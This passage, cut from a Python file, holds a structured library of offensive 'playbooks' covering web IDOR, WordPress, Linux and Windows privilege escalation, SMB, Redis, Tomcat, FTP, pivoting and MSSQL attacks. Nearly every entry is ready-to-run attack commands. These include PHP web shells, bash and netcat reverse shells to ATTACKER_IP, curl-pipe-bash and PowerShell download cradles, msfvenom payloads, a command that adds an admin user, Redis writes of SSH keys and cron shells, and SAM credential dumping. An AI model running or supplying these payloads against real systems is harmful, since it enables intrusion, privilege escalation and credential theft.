  /api/auth, /api/login, /oauth/token

MITRE: T1190 Exploit Public-Facing Application, T1078 Valid Accounts
"""),

_pb(
    title="Web - IDOR Insecure Direct Object Reference",
    phase="exploit", outcome="data extracted",
    tools=["burpsuite", "ffuf", "curl"],
    mitre_ttps=["T1190", "T1213"],
    attack_types=["idor", "access_control"], services=["http", "https"],
    text="""
IDOR - Access or modify other users' data by manipulating object identifiers in requests.

DETECT IDOR:
  Look for: /api/users/1234, /download?file_id=5678, /account?id=9012
  Any numeric or UUID-based reference to user data
  Horizontal privilege escalation (user to user same role)
  Vertical privilege escalation (user to admin)

TEST METHODOLOGY:
  1. Register two accounts (victim and attacker)
  2. Perform actions as victim, capture requests in Burp
  3. Replace session token with attacker's, replay requests to victim's IDs
  4. If attacker can read victim data = IDOR

COMMON IDOR PARAMETERS:
  ?user_id=, ?account_id=, ?order_id=, ?invoice_id=, ?file_id=
  /users/{id}/profile, /api/v1/orders/{order_id}

MASS ASSIGNMENT IDOR:
  POST /api/user/update with extra fields: {"role": "admin", "is_admin": true}
  PUT /api/profile with: {"user_id": "another_users_id"}

GUID/UUID BRUTEFORCE if sequential:
  ffuf -w ids.txt -u http://TARGET/api/users/FUZZ -H "Authorization: Bearer ATTACKER_TOKEN"

HIDDEN PARAMETERS via param mining:
  ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://TARGET/api/user?FUZZ=1234

MITRE: T1190 Exploit Public-Facing Application, T1213 Data from Information Repositories
"""),

_pb(
    title="Web - WordPress Exploitation",
    phase="exploit", outcome="shell obtained",
    tools=["wpscan", "metasploit", "curl", "burpsuite"],
    mitre_ttps=["T1190", "T1505.003"],
    attack_types=["cms_exploit"], services=["http", "https"],
    text="""
WordPress Exploitation - WordPress powers 40% of the web and has many attack vectors.

ENUMERATE WITH WPSCAN:
  wpscan --url http://TARGET/ --enumerate u  (enumerate users)
  wpscan --url http://TARGET/ --enumerate vp --plugins-detection aggressive
  wpscan --url http://TARGET/ -U admin -P /usr/share/wordlists/rockyou.txt
  wpscan --url http://TARGET/ --api-token YOUR_TOKEN

MANUAL DISCOVERY:
  http://TARGET/wp-json/wp/v2/users  (enumerate users without auth)
  http://TARGET/wp-login.php  (default login page)
  http://TARGET/xmlrpc.php  (XML-RPC - brute force multiplier)

UPLOAD PHP SHELL via THEME EDITOR (if admin):
  Login wp-admin -> Appearance -> Theme Editor -> 404.php
  Add: <?php system($_GET['cmd']); ?>
  Access: http://TARGET/wp-content/themes/THEME/404.php?cmd=id

PLUGIN EXPLOIT PATH:
  Exploit vulnerable plugin (check wpscan vuln db with API token)
  Install malicious plugin with web shell if admin access

METASPLOIT WordPress admin shell upload:
  use exploit/unix/webapp/wp_admin_shell_upload
  set RHOSTS TARGET, set USERNAME admin, set PASSWORD pass, run

MITRE: T1190 Exploit Public-Facing Application, T1505.003 Web Shell
"""),

]  # end WEB_PLAYBOOKS


# ===========================================================================
#  LINUX PRIVILEGE ESCALATION PLAYBOOKS
# ===========================================================================

LINUX_PRIVESC_PLAYBOOKS = [

_pb(
    title="Linux PrivEsc - LinPEAS Full Enumeration",
    phase="post-exploit", outcome="privilege escalated",
    tools=["linpeas", "linenum", "pspy"],
    mitre_ttps=["T1082", "T1083", "T1069"],
    attack_types=["linux_privesc"], services=[],
    os_hint="linux",
    text="""
Linux Privilege Escalation Enumeration - Always run LinPEAS first on every Linux shell.
LinPEAS automatically checks hundreds of privesc vectors and highlights them by severity.

TRANSFER AND RUN LINPEAS:
  Attacker serves: python3 -m http.server 8080
  On target: curl http://ATTACKER_IP:8080/linpeas.sh | bash
  On target: wget http://ATTACKER_IP:8080/linpeas.sh -O /tmp/lp.sh && bash /tmp/lp.sh
  Save output: bash linpeas.sh | tee /tmp/out.txt 2>&1

KEY THINGS LINPEAS CHECKS (look for RED/YELLOW highlights):
  SUID/SGID binaries - run GTFOBins recipes
  Sudo -l entries - what can current user run as root
  World-writable files and directories
  Cron jobs running as root
  Writable /etc/passwd or /etc/shadow
  Linux capabilities (cap_setuid, cap_net_admin, etc.)
  NFS shares with no_root_squash
  Running processes and services
  Environment variables and PATH hijacking
  Container escape indicators (docker socket, etc.)
  Password/credential patterns in files

QUICK MANUAL CHECKS after LinPEAS:
  sudo -l  (always check first)
  id; groups
  find / -perm -4000 -type f 2>/dev/null  (SUID files)
  cat /etc/crontab; ls -la /etc/cron.*
  env; cat /proc/1/environ

ADDITIONAL TOOLS:
  pspy64 - monitor processes without root, shows cron jobs running as UID 0
  linenum.sh: bash linenum.sh -t -k password

MITRE: T1082 System Information Discovery, T1083 File and Directory Discovery
"""),

_pb(
    title="Linux PrivEsc - SUID Binaries and GTFOBins",
    phase="post-exploit", outcome="privilege escalated",
    tools=["gtfobins", "find"],
    mitre_ttps=["T1548.001"],
    attack_types=["suid_abuse", "linux_privesc"], services=[],
    os_hint="linux",
    text="""
SUID Binary Abuse - Execute binaries with SUID bit set to get root shell.
SUID binaries run with the file OWNER's permissions (often root) regardless of who runs them.

FIND ALL SUID BINARIES:
  find / -perm -4000 -type f 2>/dev/null
  find / -perm -u=s -type f 2>/dev/null
  find / -perm -4000 -o -perm -2000 -type f 2>/dev/null  (SUID + SGID)

CHECK GTFOBins for each: https://gtfobins.github.io/

COMMON SUID EXPLOITS:
  bash -p (if bash has SUID)
  find: find . -exec /bin/bash -p \; -quit
  vim: vim -c ':!/bin/bash -p'
  python: python -c 'import os; os.execl("/bin/bash","bash","-p")'
  perl: perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
  nmap old: nmap --interactive then !sh
  env: env /bin/bash -p
  awk: awk 'BEGIN {system("/bin/bash -p")}'
  more/less/man: run binary, then !/bin/bash
  tee: echo "root2::0:0:root:/root:/bin/bash" | tee -a /etc/passwd

CAPABILITIES ABUSE:
  getcap -r / 2>/dev/null  (find binaries with capabilities)
  python3 with cap_setuid: python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  perl with cap_setuid: perl -e 'use POSIX; POSIX::setuid(0); exec "/bin/bash";'

MITRE: T1548.001 Abuse Elevation Control Mechanism Setuid and Setgid
"""),

_pb(
    title="Linux PrivEsc - Sudo Misconfiguration",
    phase="post-exploit", outcome="privilege escalated",
    tools=["sudo", "gtfobins"],
    mitre_ttps=["T1548.003"],
    attack_types=["sudo_abuse", "linux_privesc"], services=[],
    os_hint="linux",
    text="""
Sudo Misconfiguration Abuse - Exploit sudo rules that allow running commands as root.
sudo -l is ALWAYS the first manual check after getting a shell.

CHECK SUDO PERMISSIONS:
  sudo -l  (list what current user can run as root)

NOPASSWD EXPLOITATION:
  sudo vim: sudo vim -c ':!/bin/bash'
  sudo find: sudo find . -exec /bin/sh \;
  sudo python3: sudo python3 -c 'import os; os.system("/bin/bash")'
  sudo less: sudo less /etc/passwd then !/bin/bash
  sudo awk: sudo awk 'BEGIN {system("/bin/bash")}'
  sudo perl: sudo perl -e 'exec "/bin/bash";'
  sudo tee: echo "username ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/username
  sudo nano: sudo nano /etc/sudoers then add user with ALL

LD_PRELOAD EXPLOIT (if env_keep += LD_PRELOAD in sudoers):
  Create shared lib that calls setuid(0) in _init
  Compile: gcc -fPIC -shared -o /tmp/shell.so /tmp/shell.c -nostartfiles
  Run: sudo LD_PRELOAD=/tmp/shell.so find

SUDO CVE-2021-3156 BARON SAMEDIT:
  Check sudo version: sudo --version (vulnerable: < 1.9.5p2)
  Metasploit: use exploit/linux/local/sudo_baron_samedit

MITRE: T1548.003 Abuse Elevation Control Mechanism Sudo and Sudo Caching
"""),

_pb(
    title="Linux PrivEsc - Cron Job Hijacking",
    phase="post-exploit", outcome="privilege escalated",
    tools=["pspy", "crontab"],
    mitre_ttps=["T1053.003"],
    attack_types=["cron_abuse", "linux_privesc"], services=[],
    os_hint="linux",
    text="""
Cron Job Hijacking - Exploit cron jobs running as root that call writable scripts or use PATH.

FIND CRON JOBS:
  cat /etc/crontab
  ls -la /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
  pspy64 - BEST TOOL: monitors processes without root, shows cron execution as UID=0
    ./pspy64  (wait 2+ minutes)

VECTOR 1 - Writable script called by cron:
  crontab shows: 0 * * * * root /opt/backup.sh
  ls -la /opt/backup.sh  (if writable by current user)
  Append reverse shell: echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/backup.sh

VECTOR 2 - Cron uses relative PATH (no absolute path in command):
  cron PATH may start with /tmp or a writable dir
  Create malicious script with same name in writable PATH dir

VECTOR 3 - Wildcard injection:
  Cron runs: cd /var/backups && tar czf backup.tgz *
  The * expands to filenames in dir, inject tar options:
  touch /var/backups/--checkpoint=1
  touch /var/backups/--checkpoint-action=exec=shell.sh
  echo '#!/bin/bash\nbash -i >& /dev/tcp/ATTACKER/4444 0>&1' > /var/backups/shell.sh
  chmod +x /var/backups/shell.sh

MITRE: T1053.003 Scheduled Task/Job Cron
"""),

_pb(
    title="Linux PrivEsc - Docker Socket Escape",
    phase="post-exploit", outcome="host root obtained",
    tools=["docker"],
    mitre_ttps=["T1611"],
    attack_types=["container_escape", "linux_privesc"], services=[],
    os_hint="linux",
    text="""
Docker Socket Escape - Mount host filesystem to escape container and get root on host.
If /var/run/docker.sock is accessible from inside a container or to a low-priv user.

DETECT DOCKER SOCKET ACCESS:
  ls -la /var/run/docker.sock
  id  (check if user is in docker group)

ESCAPE - Mount root filesystem:
  docker run -v /:/mnt --rm -it alpine chroot /mnt sh
  docker run -v /:/host --rm alpine chroot /host /bin/bash
  docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh

ADD SSH KEY TO ROOT via escape:
  docker run -v /root:/mnt --rm alpine sh -c "mkdir -p /mnt/.ssh && echo 'ATTACKER_SSH_PUB_KEY' >> /mnt/.ssh/authorized_keys"

PRIVILEGED CONTAINER ESCAPE (already inside privileged container):
  fdisk -l  (list host disks)
  mkdir /mnt/host && mount /dev/sda1 /mnt/host
  chroot /mnt/host

DETECT IF INSIDE CONTAINER:
  cat /proc/1/cgroup | grep docker
  ls /.dockerenv  (file exists inside containers)

MITRE: T1611 Escape to Host
"""),

_pb(
    title="Linux PrivEsc - NFS No Root Squash",
    phase="post-exploit", outcome="privilege escalated",
    tools=["showmount", "mount", "nmap"],
    mitre_ttps=["T1548.001"],
    attack_types=["nfs_abuse", "linux_privesc"], services=["nfs"],
    os_hint="linux",
    text="""
NFS no_root_squash - Root on attacker machine equals root on NFS share.
no_root_squash means root on NFS client is not mapped to nobody.

DISCOVER NFS SHARES:
  showmount -e TARGET_IP
  nmap -sV -p 111,2049 TARGET_IP
  nmap -sV --script=nfs-ls,nfs-showmount,nfs-statfs TARGET_IP

CHECK EXPORTS FILE for no_root_squash:
  cat /etc/exports  (on target)
  Look for: /share *(rw,no_root_squash)

MOUNT AND ABUSE (from attacker machine as root):
  mkdir /tmp/nfs_mount
  mount -t nfs TARGET_IP:/share /tmp/nfs_mount
  cp /bin/bash /tmp/nfs_mount/bash
  chmod u+s /tmp/nfs_mount/bash

EXECUTE ON TARGET:
  /tmp/nfs_mount/bash -p  (SUID bash owned by root = root shell)

MITRE: T1548.001 Abuse Elevation Control Mechanism Setuid and Setgid
"""),

]  # end LINUX_PRIVESC_PLAYBOOKS


# ===========================================================================
#  WINDOWS PRIVILEGE ESCALATION PLAYBOOKS
# ===========================================================================

WINDOWS_PRIVESC_PLAYBOOKS = [

_pb(
    title="Windows PrivEsc - WinPEAS Full Enumeration",
    phase="post-exploit", outcome="privilege escalated",
    tools=["winpeas", "powerup", "seatbelt"],
    mitre_ttps=["T1082", "T1083"],
    attack_types=["windows_privesc"], services=[],
    os_hint="windows",
    text="""
Windows Privilege Escalation Enumeration - Run WinPEAS first on every Windows shell.

TRANSFER AND RUN WINPEAS:
  Attacker: python3 -m http.server 8080
  Target PowerShell:
    (New-Object Net.WebClient).DownloadFile('http://ATTACKER:8080/winPEASx64.exe','C:\\Windows\\Temp\\wp.exe')
    C:\\Windows\\Temp\\wp.exe
  Or via CMD:
    certutil -urlcache -split -f http://ATTACKER:8080/winPEASx64.exe C:\\Windows\\Temp\\wp.exe

KEY FINDINGS FROM WINPEAS (red/yellow highlights):
  AlwaysInstallElevated registry keys = MSI install as SYSTEM
  Unquoted service paths with spaces and writable directories
  Modifiable services (can change binPath)
  Stored credentials via cmdkey /list or Credential Manager
  Autologon credentials in registry
  SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege = Potato attacks

MANUAL KEY COMMANDS:
  whoami /priv  (look for SeImpersonate, SeDebug, SeBackup)
  whoami /groups
  sc query  (list services)
  netstat -ano
  reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run

POWERUP ALTERNATIVE:
  powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/PowerUp.ps1'); Invoke-AllChecks"

MITRE: T1082 System Information Discovery, T1083 File and Directory Discovery
"""),

_pb(
    title="Windows PrivEsc - Token Impersonation Potato Attacks",
    phase="post-exploit", outcome="SYSTEM obtained",
    tools=["juicypotato", "sweetpotato", "printspoofer", "godpotato"],
    mitre_ttps=["T1134.001"],
    attack_types=["token_impersonation", "windows_privesc"], services=[],
    os_hint="windows",
    text="""
Token Impersonation via Potato Attacks - Escalate from service account to SYSTEM.
Works when you have a service/IIS/SQL shell with SeImpersonatePrivilege.

CHECK FOR REQUIRED PRIVILEGE:
  whoami /priv  (look for SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege)
  If enabled = SYSTEM shell is almost guaranteed

GODPOTATO (modern, works on Windows Server 2012-2022):
  GodPotato.exe -cmd "cmd /c whoami"
  GodPotato.exe -cmd "cmd /c net user hacker Pass123! /add && net localgroup administrators hacker /add"
  GodPotato.exe -cmd "cmd /c C:\\Windows\\Temp\\shell.exe"

PRINTSPOOFER (Windows 10/Server 2019):
  PrintSpoofer64.exe -i -c cmd  (interactive SYSTEM cmd)
  PrintSpoofer64.exe -c "nc.exe ATTACKER_IP 4444 -e cmd"

JUICYPOTATO (Windows < Server 2019, requires CLSID):
  JuicyPotato.exe -l 1337 -p cmd.exe -t * -c {CLSID}
  CLSID list: github.com/ohpe/juicy-potato/tree/master/CLSID

SWEETPOTATO (file-less):
  SweetPotato.exe -p C:\\Windows\\System32\\cmd.exe -a '/c whoami'

CONTEXT WHERE THIS WORKS:
  IIS web shell (IUSR has SeImpersonatePrivilege)
  SQL Server xp_cmdshell (MSSQL service account)
  Any Windows Service account

MITRE: T1134.001 Access Token Manipulation Token Impersonation/Theft
"""),

_pb(
    title="Windows PrivEsc - Unquoted Service Paths",
    phase="post-exploit", outcome="privilege escalated",
    tools=["sc", "wmic", "powerup", "icacls"],
    mitre_ttps=["T1574.009"],
    attack_types=["service_abuse", "windows_privesc"], services=[],
    os_hint="windows",
    text="""
Unquoted Service Paths - Place malicious executable in path that Windows resolves before the real binary.
When a service path has spaces and no quotes, Windows tries each possible binary location.

HOW IT WORKS:
  Path: C:\\Program Files\\My App\\bin\\service.exe
  Windows tries: C:\\Program.exe, C:\\Program Files\\My.exe, then the real path
  If C:\\Program Files\\ is writable = place My.exe there for privilege escalation

FIND UNQUOTED PATHS:
  wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\"
  sc qc SERVICENAME  (check specific service config)
  PowerUp: Get-ServiceUnquoted | Select-Object *

CHECK DIRECTORY PERMISSIONS for writable paths:
  icacls "C:\\Program Files\\"  (check if current user can write)
  icacls "C:\\Program Files\\Vulnerable App\\"
  PowerUp: Get-ServiceUnquoted | Get-ModifiablePath

EXPLOIT - Place malicious binary at writable path:
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f exe -o Program.exe
  Copy to writable path, then restart service:
  sc stop SERVICENAME && sc start SERVICENAME
  Or wait for restart/reboot

MITRE: T1574.009 Hijack Execution Flow Path Interception by Unquoted Path
"""),

_pb(
    title="Windows PrivEsc - AlwaysInstallElevated MSI",
    phase="post-exploit", outcome="SYSTEM obtained",
    tools=["msfvenom", "reg"],
    mitre_ttps=["T1548.002"],
    attack_types=["alwaysinstallelevated", "windows_privesc"], services=[],
    os_hint="windows",
    text="""
AlwaysInstallElevated - Install MSI packages as SYSTEM if two registry keys are set.

CHECK IF VULNERABLE:
  reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated
  Both must equal 0x1 for the attack to work
  PowerUp: Get-RegistryAlwaysInstallElevated

CREATE MALICIOUS MSI with msfvenom:
  msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o shell.msi
  msfvenom -p windows/exec CMD="net localgroup administrators USER /add" -f msi -o add_admin.msi

INSTALL MSI (runs as SYSTEM due to policy):
  msiexec /quiet /qn /i C:\\Windows\\Temp\\shell.msi

CATCH REVERSE SHELL:
  nc -lvnp 4444 on attacker  (shell comes as SYSTEM)

MITRE: T1548.002 Abuse Elevation Control Mechanism Bypass UAC and Windows Integrity
"""),

_pb(
    title="Windows PrivEsc - Credential Hunting Registry and Files",
    phase="post-exploit", outcome="credential obtained",
    tools=["reg", "findstr", "mimikatz", "lazagne"],
    mitre_ttps=["T1552.001", "T1552.002"],
    attack_types=["credential_hunting", "windows_privesc"], services=[],
    os_hint="windows",
    text="""
Windows Credential Hunting - Find plaintext passwords in registry, files, and config.

REGISTRY CREDENTIAL SEARCHES:
  reg query HKLM /f password /t REG_SZ /s
  reg query HKCU /f password /t REG_SZ /s
  reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon  (Autologon creds)
  reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\SNMP /s  (SNMP community string)

FILE SEARCHES for credentials:
  findstr /si password *.txt *.ini *.config *.xml *.php *.asp *.aspx 2>nul
  findstr /si "password=" *.txt *.ini *.config *.xml 2>nul
  dir /s /b *pass* *cred* *vnc* *.config 2>nul
  type C:\\Windows\\Panther\\Unattend.xml  (unattended install creds)
  type C:\\Windows\\Panther\\Unattended.xml
  type C:\\inetpub\\wwwroot\\web.config  (IIS config with DB creds)
  dir C:\\Users\\ /b  (list all user home directories)

POWERSHELL HISTORY:
  type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
  type C:\\Users\\USER\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt

SAVED CREDENTIALS:
  cmdkey /list  (stored credentials)
  runas /savecred /user:admin cmd.exe  (use saved cred if admin listed)

LAZAGNE - automated credential dump:
  lazagne.exe all  (dumps credentials from browsers, apps, etc.)
  lazagne.exe browsers

SAM DATABASE DUMP (if admin/SYSTEM):
  reg save HKLM\\SAM C:\\Windows\\Temp\\sam
  reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system
  Then: impacket-secretsdump -sam sam -system system LOCAL

MITRE: T1552.001 Unsecured Credentials Credentials In Files, T1552.002 Credentials in Registry
"""),

]  # end WINDOWS_PRIVESC_PLAYBOOKS


# ===========================================================================
#  NETWORK SERVICES PLAYBOOKS
# ===========================================================================

NETWORK_PLAYBOOKS = [

_pb(
    title="Network - SMB Exploitation EternalBlue MS17-010",
    phase="exploit", outcome="shell obtained",
    tools=["metasploit", "nmap", "impacket"],
    mitre_ttps=["T1210", "T1059"],
    attack_types=["smb_exploit"], services=["smb"],
    os_hint="windows",
    text="""
SMB Exploitation - EternalBlue MS17-010 gives SYSTEM shell on unpatched Windows.
Also covers SMB enumeration and credential attacks.

DETECT SMB VULNERABILITIES:
  nmap -p 445 --script smb-vuln-ms17-010 TARGET_IP
  nmap -p 445 --script smb-vuln-* TARGET_IP
  nmap -p 445 --script smb-security-mode,smb2-security-mode TARGET_IP

ETERNALBLUE EXPLOIT with Metasploit:
  use exploit/windows/smb/ms17_010_eternalblue
  set RHOSTS TARGET_IP
  set PAYLOAD windows/x64/shell_reverse_tcp
  set LHOST ATTACKER_IP
  run

SMB ENUMERATION (no creds needed):
  enum4linux -a TARGET_IP  (full enum: shares, users, groups, policies)
  enum4linux-ng -A TARGET_IP
  smbclient -L //TARGET_IP/ -N  (list shares no password)
  crackmapexec smb TARGET_IP  (quick info: hostname, OS, SMB signing)

SMB ENUMERATION WITH CREDENTIALS:
  crackmapexec smb TARGET_IP -u USER -p PASS --shares
  crackmapexec smb TARGET_IP -u USER -p PASS --users
  smbclient //TARGET_IP/SHARE -U USER%PASS

BRUTE FORCE SMB:
  crackmapexec smb TARGET_IP -u users.txt -p passwords.txt
  crackmapexec smb TARGET_IP -u admin -p rockyou.txt

SMB NULL SESSION (older Windows/Samba):
  smbclient //TARGET_IP/IPC$ -N
  rpcclient -U "" -N TARGET_IP
  rpcclient commands: enumdomusers, enumdomgroups, querydominfo

MITRE: T1210 Exploitation of Remote Services, T1059 Command and Scripting Interpreter
"""),

_pb(
    title="Network - Redis Unauthenticated RCE",
    phase="exploit", outcome="shell obtained",
    tools=["redis-cli", "nmap"],
    mitre_ttps=["T1210", "T1053.003"],
    attack_types=["redis_exploit"], services=["redis"],
    os_hint="linux",
    text="""
Redis Unauthenticated RCE - Write SSH keys or cron jobs via Redis when exposed without auth.

DETECT REDIS:
  nmap -p 6379 TARGET_IP
  nmap -p 6379 --script redis-info TARGET_IP
  redis-cli -h TARGET_IP ping  (should return PONG if no auth)

CONNECT AND CHECK:
  redis-cli -h TARGET_IP
  > info  (shows Redis version, OS, etc.)
  > config get dir  (current working directory)
  > config get dbfilename  (current DB filename)

VECTOR 1 - Write SSH authorized_keys (if Redis runs as root or can write /root):
  redis-cli -h TARGET_IP
  > config set dir /root/.ssh
  > config set dbfilename "authorized_keys"
  > set x "\n\nATTACKER_SSH_PUB_KEY\n\n"
  > save
  Then SSH: ssh root@TARGET_IP

VECTOR 2 - Write cron job for reverse shell:
  redis-cli -h TARGET_IP
  > config set dir /var/spool/cron
  > config set dbfilename root
  > set x "\n\n* * * * * bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
  > save
  Listen: nc -lvnp 4444

VECTOR 3 - Write webshell if web root known:
  redis-cli -h TARGET_IP config set dir /var/www/html
  redis-cli -h TARGET_IP config set dbfilename shell.php
  redis-cli -h TARGET_IP set x "<?php system(\$_GET['cmd']); ?>"
  redis-cli -h TARGET_IP save
  curl http://TARGET_IP/shell.php?cmd=id

MITRE: T1210 Exploitation of Remote Services, T1053.003 Scheduled Task/Job Cron
"""),

_pb(
    title="Network - Tomcat Manager RCE WAR Upload",
    phase="exploit", outcome="shell obtained",
    tools=["msfvenom", "curl", "metasploit"],
    mitre_ttps=["T1190", "T1505.003"],
    attack_types=["tomcat_exploit"], services=["http"],
    os_hint="",
    text="""
Tomcat Manager RCE - Upload malicious WAR file via Tomcat Manager if default/weak creds.

DETECT TOMCAT:
  nmap -p 8080,8443 --script http-title TARGET_IP
  Fingerprint: Server: Apache-Coyote header
  Default manager: http://TARGET_IP:8080/manager/html

BRUTE FORCE MANAGER CREDENTIALS:
  hydra -L users.txt -P pass.txt http-get://TARGET_IP:8080/manager/html
  Default creds to try: tomcat/tomcat, admin/admin, manager/manager, tomcat/s3cret
  metasploit: use auxiliary/scanner/http/tomcat_mgr_login

CREATE WAR PAYLOAD with msfvenom:
  msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f war -o shell.war

UPLOAD AND DEPLOY via curl:
  curl -u tomcat:tomcat http://TARGET_IP:8080/manager/text/deploy?path=/shell --upload-file shell.war
  curl -u admin:admin http://TARGET_IP:8080/manager/text/deploy?path=/shell --upload-file shell.war

ACCESS THE SHELL:
  curl http://TARGET_IP:8080/shell/  (triggers JSP shell)
  Set up listener first: nc -lvnp 4444

METASPLOIT AUTOMATED:
  use exploit/multi/http/tomcat_mgr_upload
  set RHOSTS TARGET_IP, set RPORT 8080
  set HttpUsername tomcat, set HttpPassword tomcat
  run

UNDEPLOY after testing:
  curl -u tomcat:tomcat http://TARGET_IP:8080/manager/text/undeploy?path=/shell

MITRE: T1190 Exploit Public-Facing Application, T1505.003 Web Shell
"""),

_pb(
    title="Network - FTP Exploitation Anonymous and Exploit",
    phase="exploit", outcome="credential obtained",
    tools=["nmap", "ftp", "hydra", "metasploit"],
    mitre_ttps=["T1210", "T1083"],
    attack_types=["ftp_exploit"], services=["ftp"],
    text="""
FTP Exploitation - Anonymous login, brute force, and version-specific exploits.

DETECT FTP:
  nmap -p 21 --script ftp-anon,ftp-bounce,ftp-syst,ftp-brute TARGET_IP

ANONYMOUS LOGIN:
  ftp TARGET_IP  (username: anonymous, password: anything)
  nmap -p 21 --script ftp-anon TARGET_IP
  Files accessible anonymously may contain credentials or be writable

BRUTE FORCE:
  hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://TARGET_IP
  hydra -L users.txt -P pass.txt TARGET_IP ftp

VSFTPD 2.3.4 BACKDOOR (CVE-2011-2523):
  nmap -p 21 --script ftp-vsftpd-backdoor TARGET_IP
  metasploit: use exploit/unix/ftp/vsftpd_234_backdoor
  Trigger: login with username ending in smiley face :)
  Opens backdoor shell on port 6200

PROFTPD MOD_COPY RCE (unauthenticated file copy):
  nc TARGET_IP 21
  SITE CPFR /etc/passwd
  SITE CPTO /var/www/html/passwd.txt
  Then read via web: http://TARGET_IP/passwd.txt

ENUMERATE FTP FILES:
  ftp> ls -la
  ftp> get filename  (download)
  ftp> put webshell.php  (if writable - then access via web)

MITRE: T1210 Exploitation of Remote Services, T1083 File and Directory Discovery
"""),

_pb(
    title="Network - SSH Tunneling and Pivoting",
    phase="post-exploit", outcome="internal network accessed",
    tools=["ssh", "chisel", "ligolo-ng", "proxychains", "socat"],
    mitre_ttps=["T1572", "T1090"],
    attack_types=["pivoting", "tunneling"], services=["ssh"],
    text="""
SSH Tunneling and Pivoting - Route traffic through compromised hosts to reach internal networks.

LOCAL PORT FORWARD - Reach internal service via compromised host:
  ssh -L LOCAL_PORT:INTERNAL_HOST:INTERNAL_PORT user@COMPROMISED_HOST
  Example: ssh -L 3306:192.168.1.100:3306 user@10.10.10.5
  Then: mysql -h 127.0.0.1 -P 3306  (connects to internal DB)

DYNAMIC SOCKS PROXY - Route all traffic through compromised host:
  ssh -D 1080 user@COMPROMISED_HOST
  Configure proxychains: socks5 127.0.0.1 1080
  Then: proxychains nmap -sT -p 80,443,22 INTERNAL_SUBNET/24

REMOTE PORT FORWARD - Expose local listener through outbound SSH:
  ssh -R ATTACKER_PORT:127.0.0.1:4444 attacker@ATTACKER_IP
  Use when compromised host can only make outbound connections

CHISEL (HTTP tunneling - bypasses firewall):
  Attacker: chisel server -p 8080 --reverse
  Target: chisel client ATTACKER_IP:8080 R:socks  (creates SOCKS5 on attacker port 1080)
  Then use proxychains with socks5 127.0.0.1 1080

LIGOLO-NG (modern, fast pivot):
  Attacker: ligolo-ng agent listener on port 11601
  Target: ./agent -connect ATTACKER_IP:11601 -ignore-cert
  On ligolo UI: start tunnel, add route for target subnet

SOCAT RELAY (if no SSH):
  socat TCP-LISTEN:LPORT,fork TCP:INTERNAL_HOST:PORT  (relay on compromised host)

PROXYCHAINS CONFIG (/etc/proxychains4.conf):
  socks5 127.0.0.1 1080
  proxychains4 -q nmap -sT -Pn TARGET

MITRE: T1572 Protocol Tunneling, T1090 Proxy
"""),

]  # end NETWORK_PLAYBOOKS


# ===========================================================================
#  DATABASE ATTACK PLAYBOOKS
# ===========================================================================

DATABASE_PLAYBOOKS = [

_pb(
    title="Database - MSSQL xp_cmdshell RCE",
    phase="exploit", outcome="shell obtained",
    tools=["impacket", "mssqlclient", "crackmapexec", "metasploit"],
    mitre_ttps=["T1190", "T1059"],
    attack_types=["mssql_rce"], services=["mssql"],
    os_hint="windows",
    text="""
MSSQL xp_cmdshell RCE - Execute OS commands via SQL Server xp_cmdshell stored procedure.

FIND MSSQL:
  nmap -p 1433 TARGET_IP
  nmap -p 1433 --script ms-sql-info,ms-sql-config,ms-sql-empty-password TARGET_IP
  crackmapexec mssql TARGET_SUBNET/24

CONNECT TO MSSQL:
  impacket-mssqlclient DOMAIN/USER:PASS@TARGET_IP -windows-auth
  impacket-mssqlclient USER:PASS@TARGET_IP  (SQL auth)
  sqsh -S TARGET_IP -U USER -P PASS  (alternative)

ENABLE xp_cmdshell (if admin access):
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

EXECUTE OS COMMANDS:
  EXEC xp_cmdshell 'whoami';
  EXEC xp_cmdshell 'net user';
  EXEC xp_cmdshell 'type C:\\Users\\Administrator\\Desktop\\flag.txt';

REVERSE SHELL via xp_cmdshell:
  Download and run netcat or PowerShell reverse shell:
  EXEC xp_cmdshell 'certutil -urlcache -split -f http://ATTACKER/nc.exe C:\\Windows\\Temp\\nc.exe';
  EXEC xp_cmdshell 'C:\\Windows\\Temp\\nc.exe ATTACKER_IP 4444 -e cmd.exe';

POWERSHELL CRADLE via xp_cmdshell:
  EXEC xp_cmdshell 'powershell -nop -w hidden -enc BASE64_ENCODED_PAYLOAD';

LINKED SERVER ABUSE (lateral movement via MSSQL links):
  SELECT * FROM sys.servers;  (list linked servers)
  EXEC ('xp_cmdshell ''whoami''') AT [LINKED_SERVER];

METASPLOIT:
  use exploit/windows/mssql/mssql_payload
  set RHOSTS TARGET, set USERNAME sa, set PASSWORD password
  run

MITRE: T1190 Exploit Public-Facing Application, T1059 Command and Scripting Interpreter
"""),

_pb(
    title="Database - MySQL UDF RCE and Credential Extraction",
